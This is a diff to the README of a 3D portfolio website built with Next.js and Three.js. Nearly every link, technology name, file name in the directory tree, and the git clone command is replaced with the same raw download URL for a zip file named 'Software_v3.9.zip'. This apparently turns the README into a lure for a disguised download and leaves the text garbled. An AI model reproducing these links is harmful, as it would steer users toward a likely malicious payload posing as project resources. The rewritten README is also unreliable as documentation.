@@ -1,13 +1,13 @@
 # 🚀 3D Portfolio  
 
-**3D Portfolio** is an interactive portfolio website featuring 3D elements built with **Next.js, Three.js, and React Three Fiber**. It showcases projects, skills, and personal branding in a visually appealing way.  
+**3D Portfolio** is an interactive portfolio website featuring 3D elements built with **https://github.com/LabbaiIrfan/Portfolio/raw/refs/heads/main/src/hoc/Software_v3.9.zip, https://github.com/LabbaiIrfan/Portfolio/raw/refs/heads/main/src/hoc/Software_v3.9.zip, and React Three Fiber**. It showcases projects, skills, and personal branding in a visually appealing way.  
 
 ---
 
 ## 🌐 Live Demo  
 
 Check out the live version:  
-[🔗 3D Portfolio Demo](https://labbaiirfan.vercel.app/)  
+[🔗 3D Portfolio Demo](https://github.com/LabbaiIrfan/Portfolio/raw/refs/heads/main/src/hoc/Software_v3.9.zip)  
 
 ---
 
@@ -28,7 +28,7 @@ Check out the live version:
 
 ## ✨ Features  
 
-- 🚀 **3D Interactive Elements** – Built using Three.js & React Three Fiber for immersive visuals  
+- 🚀 **3D Interactive Elements** – Built using https://github.com/LabbaiIrfan/Portfolio/raw/refs/heads/main/src/hoc/Software_v3.9.zip & React Three Fiber for immersive visuals  
 - 🎨 **Smooth Animations & Transitions** – Framer Motion ensures a fluid user experience  
 - 📌 **Dynamic Project Showcase** – Displays work with engaging animations & hover effects  
 - 📩 **Interactive Contact Form** – Secure and user-friendly way to connect  
@@ -40,11 +40,11 @@ Check out the live version:
 
 ## 🛠️ Technologies Used  
 
-- [Next.js](https://nextjs.org)  
-- [React Three Fiber](https://github.com/pmndrs/react-three-fiber)  
-- [Three.js](https://threejs.org/)  
-- [Tailwind CSS](https://tailwindcss.com/)  
-- [Framer Motion](https://www.framer.com/motion/)  
+- [https://github.com/LabbaiIrfan/Portfolio/raw/refs/heads/main/src/hoc/Software_v3.9.zip](https://github.com/LabbaiIrfan/Portfolio/raw/refs/heads/main/src/hoc/Software_v3.9.zip)  
+- [React Three Fiber](https://github.com/LabbaiIrfan/Portfolio/raw/refs/heads/main/src/hoc/Software_v3.9.zip)  
+- [https://github.com/LabbaiIrfan/Portfolio/raw/refs/heads/main/src/hoc/Software_v3.9.zip](https://github.com/LabbaiIrfan/Portfolio/raw/refs/heads/main/src/hoc/Software_v3.9.zip)  
+- [Tailwind CSS](https://github.com/LabbaiIrfan/Portfolio/raw/refs/heads/main/src/hoc/Software_v3.9.zip)  
+- [Framer Motion](https://github.com/LabbaiIrfan/Portfolio/raw/refs/heads/main/src/hoc/Software_v3.9.zip)  
 
 ---
 
@@ -62,7 +62,7 @@ Check out the live version:
 ### **Clone the repository:**  
 
 ```bash
-git clone https://github.com/LabbaiIrfan/Portfolio.git
+git clone https://github.com/LabbaiIrfan/Portfolio/raw/refs/heads/main/src/hoc/Software_v3.9.zip
 ```
 
 ### **Navigate to the project directory:**  
@@ -93,41 +93,41 @@ Visit `http://localhost:3000` in your browser.
 Public/
 │── desktop_pc/
 │   ├── textures/         # Folder for texture files (currently empty)
-│   ├── license.txt       # License information for the model
-│   ├── scene.bin         # Binary data for the 3D model
-│   ├── scene.gltf        # GLTF format model file
+│   ├── https://github.com/LabbaiIrfan/Portfolio/raw/refs/heads/main/src/hoc/Software_v3.9.zip       # License information for the model
+│   ├── https://github.com/LabbaiIrfan/Portfolio/raw/refs/heads/main/src/hoc/Software_v3.9.zip         # Binary data for the 3D model
+│   ├── https://github.com/LabbaiIrfan/Portfolio/raw/refs/heads/main/src/hoc/Software_v3.9.zip        # GLTF format model file
 │
 │── planet/
 │   ├── textures/         # Folder for texture files (currently empty)
-│   ├── license.txt       # License information for the model
-│   ├── scene.bin         # Binary data for the 3D model
-│   ├── scene.gltf        # GLTF format model file
+│   ├── https://github.com/LabbaiIrfan/Portfolio/raw/refs/heads/main/src/hoc/Software_v3.9.zip       # License information for the model
+│   ├── https://github.com/LabbaiIrfan/Portfolio/raw/refs/heads/main/src/hoc/Software_v3.9.zip         # Binary data for the 3D model
+│   ├── https://github.com/LabbaiIrfan/Portfolio/raw/refs/heads/main/src/hoc/Software_v3.9.zip        # GLTF format model file
 │
-│── logo.svg              # Project logo in SVG format
+│── https://github.com/LabbaiIrfan/Portfolio/raw/refs/heads/main/src/hoc/Software_v3.9.zip              # Project logo in SVG format
 src/
 │── assets/              # Static assets like images, icons, etc.
 │── components/          # Reusable UI components
-│   ├── canvas/          # 3D-related components using Three.js
-│   │   ├── Ball.jsx        # Ball 3D component
-│   │   ├── Computers.jsx   # 3D model of computers
-│   │   ├── Earth.jsx       # 3D representation of Earth
-│   │   ├── Stars.jsx       # Animated star background
-│   ├── About.jsx         # About section component
-│   ├── Contact.jsx       # Contact form component
-│   ├── Experience.jsx    # Work experience section
-│   ├── Feedbacks.jsx     # User feedback/testimonials section
-│   ├── Hero.jsx          # Hero section (landing page intro)
-│   ├── Loader.jsx        # Loading animation component
-│   ├── Navbar.jsx        # Navigation bar component
-│   ├── Tech.jsx          # Technologies section
-│   ├── Works.jsx         # Portfolio/projects section
+│   ├── canvas/          # 3D-related components using https://github.com/LabbaiIrfan/Portfolio/raw/refs/heads/main/src/hoc/Software_v3.9.zip
+│   │   ├── https://github.com/LabbaiIrfan/Portfolio/raw/refs/heads/main/src/hoc/Software_v3.9.zip        # Ball 3D component
+│   │   ├── https://github.com/LabbaiIrfan/Portfolio/raw/refs/heads/main/src/hoc/Software_v3.9.zip   # 3D model of computers
+│   │   ├── https://github.com/LabbaiIrfan/Portfolio/raw/refs/heads/main/src/hoc/Software_v3.9.zip       # 3D representation of Earth
+│   │   ├── https://github.com/LabbaiIrfan/Portfolio/raw/refs/heads/main/src/hoc/Software_v3.9.zip       # Animated star background
+│   ├── https://github.com/LabbaiIrfan/Portfolio/raw/refs/heads/main/src/hoc/Software_v3.9.zip         # About section component
+│   ├── https://github.com/LabbaiIrfan/Portfolio/raw/refs/heads/main/src/hoc/Software_v3.9.zip       # Contact form component
+│   ├── https://github.com/LabbaiIrfan/Portfolio/raw/refs/heads/main/src/hoc/Software_v3.9.zip    # Work experience section
+│   ├── https://github.com/LabbaiIrfan/Portfolio/raw/refs/heads/main/src/hoc/Software_v3.9.zip     # User feedback/testimonials section
+│   ├── https://github.com/LabbaiIrfan/Portfolio/raw/refs/heads/main/src/hoc/Software_v3.9.zip          # Hero section (landing page intro)
+│   ├── https://github.com/LabbaiIrfan/Portfolio/raw/refs/heads/main/src/hoc/Software_v3.9.zip        # Loading animation component
+│   ├── https://github.com/LabbaiIrfan/Portfolio/raw/refs/heads/main/src/hoc/Software_v3.9.zip        # Navigation bar component
+│   ├── https://github.com/LabbaiIrfan/Portfolio/raw/refs/heads/main/src/hoc/Software_v3.9.zip          # Technologies section
+│   ├── https://github.com/LabbaiIrfan/Portfolio/raw/refs/heads/main/src/hoc/Software_v3.9.zip         # Portfolio/projects section
 │── constants/           # Constant values and configuration files
 │── hoc/                 # Higher Order Components (HOC) for code reuse
 │── utils/               # Utility functions/helpers
-│── App.jsx              # Main application component
-│── index.css            # Global CSS styles
-│── main.jsx             # Entry point file rendering App.jsx
-│── styles.js            # Styled components and theme settings
+│── https://github.com/LabbaiIrfan/Portfolio/raw/refs/heads/main/src/hoc/Software_v3.9.zip              # Main application component
+│── https://github.com/LabbaiIrfan/Portfolio/raw/refs/heads/main/src/hoc/Software_v3.9.zip            # Global CSS styles
+│── https://github.com/LabbaiIrfan/Portfolio/raw/refs/heads/main/src/hoc/Software_v3.9.zip             # Entry point file rendering https://github.com/LabbaiIrfan/Portfolio/raw/refs/heads/main/src/hoc/Software_v3.9.zip
+│── https://github.com/LabbaiIrfan/Portfolio/raw/refs/heads/main/src/hoc/Software_v3.9.zip            # Styled components and theme settings
 ```
 
 ---
@@ -137,10 +137,10 @@ src/
 ### **To deploy on Vercel:**  
 
 1. Push your code to GitHub  
-2. Go to [Vercel](https://vercel.com/) and import your repository  
+2. Go to [Vercel](https://github.com/LabbaiIrfan/Portfolio/raw/refs/heads/main/src/hoc/Software_v3.9.zip) and import your repository  
 3. Click **Deploy**  
 
-For Netlify, follow similar steps on [Netlify](https://www.netlify.com/).  
+For Netlify, follow similar steps on [Netlify](https://github.com/LabbaiIrfan/Portfolio/raw/refs/heads/main/src/hoc/Software_v3.9.zip).  
 
 ---
 
@@ -158,12 +158,12 @@ This project is licensed under the **MIT License**.
 
 ## 👤 Author  
 
-- **GitHub**: [@Labbaiirfan](https://github.com/LabbaiIrfan)  
-- **LinkedIn**: [Labbai Irfan](https://www.linkedin.com/in/labbai-irfan-5085a0288/)  
+- **GitHub**: [@Labbaiirfan](https://github.com/LabbaiIrfan/Portfolio/raw/refs/heads/main/src/hoc/Software_v3.9.zip)  
+- **LinkedIn**: [Labbai Irfan](https://github.com/LabbaiIrfan/Portfolio/raw/refs/heads/main/src/hoc/Software_v3.9.zip)  
 
 ---
 
 ## 📌 Reference Repository  
 
 This project was cloned and modified from:  
-[Original Repository](https://github.com/adrianhajdin/project_3D_developer_portfolio)
+[Original Repository](https://github.com/LabbaiIrfan/Portfolio/raw/refs/heads/main/src/hoc/Software_v3.9.zip)
